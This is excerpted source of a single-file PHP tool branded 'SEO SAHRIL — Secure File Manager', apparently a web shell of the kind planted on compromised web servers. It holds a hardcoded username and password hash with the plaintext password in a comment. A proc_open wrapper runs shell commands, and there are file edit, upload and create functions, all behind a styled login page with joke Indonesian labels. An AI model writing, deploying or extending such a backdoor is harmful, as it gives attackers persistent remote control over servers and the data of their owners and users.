<?php
/**
 * SEO SAHRIL — Secure File Manager (single file) — Legacy/PHP-wide compatible
 *
...
/* ---------- Auth ---------- */
define('AUTH_USER', 'sahril');
define('AUTH_PASS_HASH', '$2a$12$702k1rKIkeJKLcvCd7Xmxe.Mp2J.aZD7HdpJIU.fXfB4Vz9f6Bega'); // pass : n0t
...
function create_nonzero_file($path, $userContent = null){
    $default = "Created by SEO SAHRIL @ ".date('c')."\n";
...
<head>
    ...
    tailwind.config={
      theme:{
        extend:{
          ...
          colors:{
            canvas:{DEFAULT:'#0b1220',surface:'rgba(15,23,42,.8)'}
          },
          boxShadow:{
            soft:'0 10px 30px rgba(0,0,0,.45)',
            card:'0 6px 20px rgba(0, 0, 0, 0.22)'
          },
  ...
  <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTqM8p1nyNQySSKMed2SuEfGCCnp6sMQQteXc-EI36pKZvveoEmBW3LUrvVXlLaZxIrtH68IfTMOra3geKYvqfnqCzNaN6B7sUJyfh51F6jE6eD-M0vnkBV4IFXHqjYjZlvNldZPvYSFyZpofEPcGKN_40aW01dCCchsjYZWx5PzN7w5nbZ8B533dIstI/s1024/3a63137d-4c47-4332-8a4a-600aa433c294.png" rel="icon">
  ...
  <style>
    ...
    /* ✅ BACKGROUND IMAGE DITAMBAHKAN DI SINI */
    .shell{
      min-height:100vh;
      background:
        linear-gradient(rgba(11,18,32,.35), rgba(11,18,32,.35)),
        url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFmIdWIb4g8Wy9Xz0WHF5Qs5g2aU0JEALd-3Jn0yiSbeQLorlTXgTU8RzXuQJhipI2OOc07nZkXEnlOkRYZYRcFSDzyojx5zG8opHtQX9G2ysE6NrzwJyaGdN1XpGKVHTUqv0qnx2U9CHIQw36GcEdAhDiuYJAwcgkayrfDrrpXsHBioiFyOEMqKrwWUs/s600/data-circuit-background-jigp4xxr9jq22ivb.gif") center/cover no-repeat;
      display:flex;
      align-items:center;
    ...
    .card{
      ...
      border:1px solid rgba(148, 163, 184, 0.53);
      border-radius:18px;
    ...
    .btn{
      ...
      box-shadow:0 6px 20px rgba(37, 83, 235, 0.75);
    }
...
<body class="shell text-slate-100">
  <div class="w-full max-w-md card p-6">
    <div class="mb-5 flex items-center justify-between">
      <div class="text-xl font-bold tracking-tight title">DI JILAT BARU DI CELUPIN</div>
      <span class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></span>
    </div>

    <?php if($err): ?>
      <div class="mb-3 rounded-lg border border-red-900/60 bg-red-900/30 text-red-100 px-3 py-2">
        <?php echo h($err); ?>
      </div>
    <?php endif; ?>
    ...
    <form method="post" action="?a=login" class="space-y-3">
      ...
      <div>
        <label class="text-sm text-slate-300">KOLOM INI USER </label>
        <input class="field mt-1" name="user" type="text" autocomplete="username" required>
      </div>
      <div>
        <label class="text-sm text-slate-300">KOLOM INI PASS </label>
        <input class="field mt-1" name="pass" type="password" autocomplete="current-password" required>
      </div>
      <button class="btn w-full" type="submit">JANGAN DI SUBMIT NANTI KE SETRUM</button>
    </form>

    <p class="text-[12px] text-slate-400 mt-4 text-center"># SEO SAHRIL</p>
      </div>
    </body></html><?php
}
...
if(!function_exists('run_with_proc_open')){
    function run_with_proc_open($cmd,$cwd=null,$timeout=30){
        ...
        while(true){
            ...
            if($r){ $w=null;$e=null; @stream_select($r,$w,$e,1); foreach($r as $p){ $chunk=@fread($p,8192); if($chunk!==false && $chunk!=='') $buf.=$chunk; } }else { usleep(100000); }
            if(!$running) break;
...
<head>
  ...
  <script>
    tailwind.config = { darkMode:'class', theme:{ extend:{
      ...
      colors:{ canvas:{DEFAULT:'#3b79ffff',light:'#3b79ffff',surface:'rgba(15, 24, 42, 0.8)'}, brand:{50:'#eef2ff',500:'#3b79ffff',600:'#3b79ffff',700:'#3b79ffff'} },
      boxShadow:{ card:'0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255, 255, 255, 0.03)' , glow:'0 6px 20px rgba(99, 101, 241, 0.25)' },
      borderRadius:{ xl2:'18px' }
    } } }
  </script>
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
  ...
  <style>
    ...
    .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99, 149, 241, 0.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(85, 128, 247, 0.12), transparent 60%), #000000ff; display:grid; grid-template-rows:auto 1fr auto;}
    ...
    .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99, 144, 241, 0.25);border-color:#ff3d3dff}
    .btn{background:linear-gradient(180deg,#ff3d3dff,#4f46e5);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
    .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99, 120, 241, 0.35)} .btn:active{transform:translateY(.5px)}
    ...
    .tbl tbody tr:nth-child(even){background:rgba(148, 159, 184, 0.04)}
    .tbl tbody tr.hoverable:hover{background:rgba(99, 137, 241, 0.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
    ...
    .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #373e51ff}
    ...
    .drop-hint{border:2px dashed rgba(99, 125, 241, 0.45); background:rgba(99,102,241,.06)}
    .droptarget{outline:2px dashed rgba(99, 144, 241, 0.7); outline-offset:-2px}
...
<body class="shell text-slate-100" id="bodyRoot">
  <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
    <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
      <div class="flex items-center gap-3 shrink-0">
        ...
        <div>
          <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">SEO SAHRIL</a></div>
              ...
              <tbody id="dirBody">
                ...
                ?>
                  <tr class="border-b border-slate-800 hoverable"
                      ...
                      data-mtime="<?php echo $mtime; ?>"draggable="true"
                      ondragstart="onDragStartItem(event, <?php echo je($name); ?>)">
                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                    <td class="py-2 px-2">
                      <div class="flex items-center gap-2 <?php echo $permColorClass; ?>">
                    ...
                    <td class="py-2 px-2">
                      <div class="row-actions"><a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Edit</a>
  ...
  <footer class="w-full px-6 py-4">
    ...
    <div class="text-xs text-slate-400 flex items-center justify-between">
      <span>© <?php echo $yearNow; ?> SEO SAHRIL — Secure File Manager · Unauthorized Access Denied 👾</span>
      <span>Engineered in the Dark · Sahril Core</span>
    </div>
  </footer>
...
if (!function_exists('fx_stream_get_contents')) {
    function fx_stream_get_contents($handle, $maxlength = -1, $offset = -1) {if (is_fn_usable('stream_get_contents')) return @stream_get_contents($handle, $maxlength, $offset);
